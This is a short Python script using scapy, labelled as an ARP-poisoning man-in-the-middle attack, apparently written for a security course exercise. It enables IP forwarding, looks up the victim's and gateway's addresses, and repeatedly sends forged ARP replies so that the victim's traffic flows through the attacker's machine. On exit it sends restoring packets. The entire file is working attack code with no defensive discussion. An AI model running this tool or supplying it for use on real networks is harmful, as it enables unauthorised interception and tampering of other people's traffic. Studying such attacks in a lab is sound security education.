#!/usr/bin/env python

# MITM attack script
# ------------------
# Route all traffic between a host and a gateway
# through your machine.
#
# For 0x375-3
#
# Karagasidis Dimitris
# http://gatoni.gr

import time, logging, os

GREEN_CLR = "\033[0;32m"
NO_CLR = "\033[0m"

def trace( msg ):
	print GREEN_CLR +  msg + NO_CLR

if os.getuid() != 0:
	trace( "You must have root privileges for this one." )
	exit()

logging.getLogger("scapy.runtime").setLevel( logging.ERROR )
from scapy.all import *

def arp_poison( attacker, victim, gateway ):
	v = ARP(	hwsrc = attacker["mac"],
						hwdst = victim["mac"],
						psrc = gateway["ip"],
						pdst = victim["ip"] )

	g = ARP(	hwsrc = attacker["mac"],
						hwdst = gateway["mac"],
						psrc = victim["ip"],
						pdst = gateway["ip"] )
	return v, g

def arp_antidote( attacker, victim, gateway ):
  v = ARP(  hwsrc = gateway["mac"],
            hwdst = victim["mac"],
            psrc = gateway["ip"],
            pdst = victim["ip"] )

  g = ARP(  hwsrc = victim["mac"],
            hwdst = gateway["mac"],
            psrc = victim["ip"],
            pdst = gateway["ip"] )
  return v, g

def get_local_data( iface ):
	ifconfig_p = os.popen( "ifconfig %s | awk 'NR == 1 { print $5 }'" % iface, "r" )
	mac = ifconfig_p.readline(); ifconfig_p.close() 
	ifconfig_p = os.popen( "ifconfig %s | awk 'NR == 2 { print $2 }'" % iface, "r" )
	ip = ifconfig_p.readline().split(":")[1]; ifconfig_p.close()
	return { "mac":mac, "ip":ip }

def get_remote_data( ip ):
	os.system( "ping -c 4 %s > /dev/null" % ip )
	arp_p = os.popen( "arp -n | grep '%s\s' | awk '{print $3}'" % ip, "r" )
	mac = arp_p.readline(); arp_p.close();
	return { "mac":mac, "ip":ip }

def usage():
	trace( "\nUsage:\n%s <victim> <gateway> <interface>\n" % sys.argv[0] )

if len( sys.argv ) != 4:
	usage()
	exit()

trace( "[+] Enabling IP Forwarding..." )
os.system( "echo '1' > /proc/sys/net/ipv4/ip_forward" )
trace( "[+] Getting local data..." )
attacker = get_local_data( sys.argv[3] )
trace( "[+] Getting victim's data..." )
victim = get_remote_data( sys.argv[1] )
trace( "[+] Getting gateway's data..." )
gateway = get_remote_data( sys.argv[2] )
trace( "[+] MITM attack in progress..." )
poison_pkt = arp_poison( attacker, victim, gateway )
antidote_pkt = arp_antidote( attacker, victim, gateway )
try:
	while True:
		for pkt in poison_pkt:
			send( pkt, verbose=0 )
		time.sleep(3)
except:
	for pkt in antidote_pkt:
		send( pkt, verbose=0 )
	trace( "\n[+] MITM attack terminated." )

